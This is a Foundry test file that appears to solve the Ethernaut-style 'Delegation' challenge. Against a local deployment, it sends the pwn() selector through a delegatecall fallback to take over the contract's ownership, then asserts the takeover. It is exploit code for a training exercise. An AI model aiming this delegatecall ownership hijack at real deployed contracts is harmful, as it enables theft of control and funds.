// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.15;

import "forge-std/Test.sol";
import "../src/Delegation.sol";

contract DelegationTest is Test {
    Delegate public src;
    Delegation public target;
    address public user = vm.addr(1);

    function setUp() public {
        src = new Delegate(address(this));
        target = new Delegation(address(src));
    }

    function testHack() public {
        assertEq(target.owner(), address(this));

        bytes memory data = abi.encodeWithSelector(Delegate.pwn.selector);

        vm.startBroadcast(user);
        (bool result, ) = address(target).call(data);
        vm.stopBroadcast();

        assertEq(result, true);

        assertEq(target.owner(), user);
    }
}
